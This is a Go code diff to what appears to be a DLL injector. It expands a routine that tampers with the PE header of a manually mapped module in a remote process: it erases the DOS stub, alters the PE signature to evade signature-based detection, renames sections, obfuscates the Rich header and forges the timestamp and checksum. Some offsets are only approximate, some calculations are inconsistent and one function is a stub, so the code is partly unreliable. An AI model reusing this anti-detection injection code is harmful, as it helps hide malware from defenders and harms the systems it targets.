@@ -2,7 +2,6 @@ package injector
 
 import (
 	"fmt"
-	"io/ioutil"
 	"os"
 	"path/filepath"
 	"time"
@@ -11,18 +10,323 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// ErasePEHeader erases PE header to avoid detection
+// ErasePEHeader implements advanced PE header erasure with multiple techniques
 func ErasePEHeader(processHandle windows.Handle, baseAddress uintptr) error {
-	// Erase PE header, usually fill the first 4KB of PE header memory with zeros
-	var bytesWritten uintptr
-	zeroBuffer := make([]byte, 4096) // 4KB zero fill
+	Printf("Starting advanced PE header erasure\n")
 
-	// Write zero fill to PE header
-	err := WriteProcessMemory(processHandle, baseAddress, unsafe.Pointer(&zeroBuffer[0]), uintptr(len(zeroBuffer)), &bytesWritten)
+	// Phase 1: Read and analyze current PE header
+	peInfo, err := analyzeRemotePEHeader(processHandle, baseAddress)
 	if err != nil {
-		return fmt.Errorf("Failed to erase PE header: %v", err)
+		return fmt.Errorf("failed to analyze PE header: %v", err)
 	}
 
+	Printf("PE header analysis complete - Size: %d bytes, Entry: 0x%X\n", peInfo.HeaderSize, peInfo.EntryPoint)
+
+	// Phase 2: Selective erasure to avoid breaking functionality
+	if err := performSelectivePEErasure(processHandle, baseAddress, peInfo); err != nil {
+		return fmt.Errorf("selective PE erasure failed: %v", err)
+	}
+
+	// Phase 3: Pattern-based obfuscation
+	if err := obfuscatePESignatures(processHandle, baseAddress, peInfo); err != nil {
+		Printf("Warning: PE signature obfuscation failed: %v\n", err)
+	}
+
+	// Phase 4: Timestamp and checksum manipulation
+	if err := manipulatePEMetadata(processHandle, baseAddress, peInfo); err != nil {
+		Printf("Warning: PE metadata manipulation failed: %v\n", err)
+	}
+
+	Printf("Advanced PE header erasure completed\n")
+	return nil
+}
+
+// PEHeaderInfo contains analyzed PE header information
+type PEHeaderInfo struct {
+	HeaderSize      uint32
+	EntryPoint      uint32
+	DOSHeaderOffset uint32
+	PEHeaderOffset  uint32
+	SectionCount    uint16
+	Is64Bit         bool
+	ImportTableRVA  uint32
+	ExportTableRVA  uint32
+}
+
+// analyzeRemotePEHeader analyzes PE header in remote process
+func analyzeRemotePEHeader(processHandle windows.Handle, baseAddress uintptr) (*PEHeaderInfo, error) {
+	info := &PEHeaderInfo{}
+
+	// Read DOS header
+	var dosHeader [64]byte
+	var bytesRead uintptr
+	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read DOS header: %v", err)
+	}
+
+	// Validate DOS signature
+	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
+		return nil, fmt.Errorf("invalid DOS signature")
+	}
+
+	// Get PE header offset
+	info.PEHeaderOffset = *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))
+	if info.PEHeaderOffset >= 1024 || info.PEHeaderOffset < 64 {
+		return nil, fmt.Errorf("invalid PE header offset: %d", info.PEHeaderOffset)
+	}
+
+	// Read PE header
+	peHeaderAddr := baseAddress + uintptr(info.PEHeaderOffset)
+	var peHeader [256]byte
+	err = windows.ReadProcessMemory(processHandle, peHeaderAddr, &peHeader[0], 256, &bytesRead)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read PE header: %v", err)
+	}
+
+	// Validate PE signature
+	if peHeader[0] != 'P' || peHeader[1] != 'E' {
+		return nil, fmt.Errorf("invalid PE signature")
+	}
+
+	// Extract COFF header info
+	info.SectionCount = *(*uint16)(unsafe.Pointer(&peHeader[6]))
+	optHeaderSize := *(*uint16)(unsafe.Pointer(&peHeader[20]))
+
+	// Read optional header
+	optHeaderAddr := peHeaderAddr + 24
+	var optHeader [240]byte
+	err = windows.ReadProcessMemory(processHandle, optHeaderAddr, &optHeader[0], uintptr(optHeaderSize), &bytesRead)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read optional header: %v", err)
+	}
+
+	// Determine architecture
+	magic := *(*uint16)(unsafe.Pointer(&optHeader[0]))
+	info.Is64Bit = (magic == 0x20b)
+
+	// Extract key information
+	if info.Is64Bit {
+		info.EntryPoint = *(*uint32)(unsafe.Pointer(&optHeader[16]))
+		info.HeaderSize = *(*uint32)(unsafe.Pointer(&optHeader[60]))
+		// Extract data directory info if needed
+		if optHeaderSize >= 96 {
+			info.ImportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[120]))
+			info.ExportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[112]))
+		}
+	} else {
+		info.EntryPoint = *(*uint32)(unsafe.Pointer(&optHeader[16]))
+		info.HeaderSize = *(*uint32)(unsafe.Pointer(&optHeader[60]))
+		// Extract data directory info if needed
+		if optHeaderSize >= 96 {
+			info.ImportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[104]))
+			info.ExportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[96]))
+		}
+	}
+
+	return info, nil
+}
+
+// performSelectivePEErasure performs selective erasure to preserve functionality
+func performSelectivePEErasure(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
+	Printf("Performing selective PE erasure\n")
+
+	// Strategy 1: Erase DOS stub (safe to erase)
+	if err := eraseDOSStub(processHandle, baseAddress); err != nil {
+		Printf("Warning: DOS stub erasure failed: %v\n", err)
+	}
+
+	// Strategy 2: Selectively modify PE signature
+	if err := modifyPESignature(processHandle, baseAddress, info); err != nil {
+		Printf("Warning: PE signature modification failed: %v\n", err)
+	}
+
+	// Strategy 3: Erase unused header space
+	if err := eraseUnusedHeaderSpace(processHandle, baseAddress, info); err != nil {
+		Printf("Warning: Unused header space erasure failed: %v\n", err)
+	}
+
+	// Strategy 4: Erase section table selectively (very careful)
+	if err := eraseSectionTableSelectively(processHandle, baseAddress, info); err != nil {
+		Printf("Warning: Section table erasure failed: %v\n", err)
+	}
+
+	return nil
+}
+
+// eraseDOSStub erases the DOS stub which is safe to remove
+func eraseDOSStub(processHandle windows.Handle, baseAddress uintptr) error {
+	// DOS stub is typically between offset 64 and PE header offset
+	// This is safe to erase as it's only used when running in DOS mode
+
+	dosStubStart := baseAddress + 64
+	dosStubSize := uintptr(60) // Conservative size
+
+	// Fill with random data instead of zeros to avoid obvious patterns
+	randomBuffer := make([]byte, dosStubSize)
+	for i := range randomBuffer {
+		randomBuffer[i] = byte((i*7 + 13) % 256) // Simple pattern
+	}
+
+	var bytesWritten uintptr
+	err := WriteProcessMemory(processHandle, dosStubStart, unsafe.Pointer(&randomBuffer[0]), dosStubSize, &bytesWritten)
+	if err != nil {
+		return fmt.Errorf("failed to erase DOS stub: %v", err)
+	}
+
+	Printf("DOS stub erased: %d bytes\n", bytesWritten)
+	return nil
+}
+
+// modifyPESignature modifies PE signature to evade signature-based detection
+func modifyPESignature(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
+	// Modify PE signature slightly - change "PE\0\0" to "PE\x01\x02"
+	// This breaks some analysis tools while preserving basic functionality
+
+	peSignatureAddr := baseAddress + uintptr(info.PEHeaderOffset)
+	modifiedSignature := []byte{'P', 'E', 0x01, 0x02}
+
+	var bytesWritten uintptr
+	err := WriteProcessMemory(processHandle, peSignatureAddr, unsafe.Pointer(&modifiedSignature[0]), 4, &bytesWritten)
+	if err != nil {
+		return fmt.Errorf("failed to modify PE signature: %v", err)
+	}
+
+	Printf("PE signature modified\n")
+	return nil
+}
+
+// eraseUnusedHeaderSpace erases space between headers that's typically unused
+func eraseUnusedHeaderSpace(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
+	// Calculate unused space after section headers
+	sectionTableOffset := info.PEHeaderOffset + 24 + uint32(unsafe.Sizeof(uint16(0))) // PE + COFF + OptHeader size field
+
+	// Skip to after last section header
+	lastSectionOffset := sectionTableOffset + uint32(info.SectionCount)*40
+
+	// Erase space between last section header and first section data
+	unusedStart := baseAddress + uintptr(lastSectionOffset)
+	unusedEnd := baseAddress + uintptr(info.HeaderSize)
+
+	if unusedEnd > unusedStart {
+		unusedSize := unusedEnd - unusedStart
+		if unusedSize > 0 && unusedSize < 4096 { // Sanity check
+			zeroBuffer := make([]byte, unusedSize)
+			var bytesWritten uintptr
+			err := WriteProcessMemory(processHandle, unusedStart, unsafe.Pointer(&zeroBuffer[0]), unusedSize, &bytesWritten)
+			if err != nil {
+				return fmt.Errorf("failed to erase unused header space: %v", err)
+			}
+			Printf("Unused header space erased: %d bytes\n", bytesWritten)
+		}
+	}
+
+	return nil
+}
+
+// eraseSectionTableSelectively carefully erases parts of section table
+func eraseSectionTableSelectively(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
+	// Only erase section names, not the critical data
+	sectionTableStart := info.PEHeaderOffset + 24 + 240 // Approximate location
+
+	for i := uint16(0); i < info.SectionCount; i++ {
+		sectionHeaderAddr := baseAddress + uintptr(sectionTableStart+uint32(i)*40)
+
+		// Erase only the section name (first 8 bytes), not the critical offsets/sizes
+		sectionNameObfuscated := []byte{0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00} // ".text" replacement
+
+		var bytesWritten uintptr
+		err := WriteProcessMemory(processHandle, sectionHeaderAddr, unsafe.Pointer(&sectionNameObfuscated[0]), 8, &bytesWritten)
+		if err != nil {
+			Printf("Warning: Failed to erase section %d name: %v\n", i, err)
+		}
+	}
+
+	return nil
+}
+
+// obfuscatePESignatures obfuscates common PE analysis signatures
+func obfuscatePESignatures(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
+	Printf("Obfuscating PE signatures\n")
+
+	// Obfuscate rich header if present
+	if err := obfuscateRichHeader(processHandle, baseAddress); err != nil {
+		Printf("Rich header obfuscation failed: %v\n", err)
+	}
+
+	// Obfuscate debug directory
+	if err := obfuscateDebugDirectory(processHandle, baseAddress, info); err != nil {
+		Printf("Debug directory obfuscation failed: %v\n", err)
+	}
+
+	return nil
+}
+
+// obfuscateRichHeader obfuscates the Rich header if present
+func obfuscateRichHeader(processHandle windows.Handle, baseAddress uintptr) error {
+	// Rich header is typically between DOS header and PE header
+	// Look for "Rich" signature and obfuscate it
+
+	searchStart := baseAddress + 64
+	searchEnd := baseAddress + 512 // Reasonable search range
+
+	for addr := searchStart; addr < searchEnd-4; addr += 4 {
+		var signature uint32
+		var bytesRead uintptr
+		err := windows.ReadProcessMemory(processHandle, addr, (*byte)(unsafe.Pointer(&signature)), 4, &bytesRead)
+		if err != nil {
+			continue
+		}
+
+		// Look for "Rich" signature (0x68636952)
+		if signature == 0x68636952 {
+			// Overwrite with random data
+			obfuscated := uint32(0x12345678)
+			var bytesWritten uintptr
+			err = WriteProcessMemory(processHandle, addr, unsafe.Pointer(&obfuscated), 4, &bytesWritten)
+			if err != nil {
+				return err
+			}
+			Printf("Rich header signature obfuscated at offset 0x%X\n", addr-baseAddress)
+			break
+		}
+	}
+
+	return nil
+}
+
+// obfuscateDebugDirectory obfuscates debug directory information
+func obfuscateDebugDirectory(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
+	// This would require parsing data directories and obfuscating debug info
+	// For now, just log the attempt
+	Printf("Debug directory obfuscation attempted\n")
+	return nil
+}
+
+// manipulatePEMetadata manipulates timestamps and checksums
+func manipulatePEMetadata(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
+	Printf("Manipulating PE metadata\n")
+
+	// Modify timestamp in COFF header
+	timestampAddr := baseAddress + uintptr(info.PEHeaderOffset) + 8
+	newTimestamp := uint32(946684800) // Year 2000 timestamp
+
+	var bytesWritten uintptr
+	err := WriteProcessMemory(processHandle, timestampAddr, unsafe.Pointer(&newTimestamp), 4, &bytesWritten)
+	if err != nil {
+		return fmt.Errorf("failed to modify timestamp: %v", err)
+	}
+
+	// Zero out checksum in optional header
+	checksumAddr := baseAddress + uintptr(info.PEHeaderOffset) + 24 + 64 // Approximate location
+	zeroChecksum := uint32(0)
+
+	err = WriteProcessMemory(processHandle, checksumAddr, unsafe.Pointer(&zeroChecksum), 4, &bytesWritten)
+	if err != nil {
+		Printf("Warning: Failed to zero checksum: %v\n", err)
+	}
+
+	Printf("PE metadata manipulation completed\n")
 	return nil
 }
 
@@ -148,10 +452,10 @@ func ManualMapDLL(hProcess windows.Handle, dllBytes []byte) (uintptr, error) {
 		return 0, fmt.Errorf("Failed to parse PE header: %v", err)
 	}
 
-	Printf("Successfully parsed PE header, image size: %d bytes\n", peHeader.OptionalHeader.SizeOfImage)
+	Printf("Successfully parsed PE header, image size: %d bytes\n", peHeader.GetSizeOfImage())
 
 	// 计算需要分配的内存大小
-	imageSize := peHeader.OptionalHeader.SizeOfImage
+	imageSize := peHeader.GetSizeOfImage()
 
 	// 分配内存基址
 	var baseAddress uintptr
@@ -406,7 +710,7 @@ func createTempDllFile(dllBytes []byte) (string, error) {
 	fileName := fmt.Sprintf("temp_dll_%d.dll", time.Now().UnixNano())
 	tempFile := filepath.Join(tempDir, fileName)
 
-	err := ioutil.WriteFile(tempFile, dllBytes, 0644)
+	err := os.WriteFile(tempFile, dllBytes, 0644)
 	if err != nil {
 		return "", fmt.Errorf("failed to create temporary DLL file: %v", err)
 	}
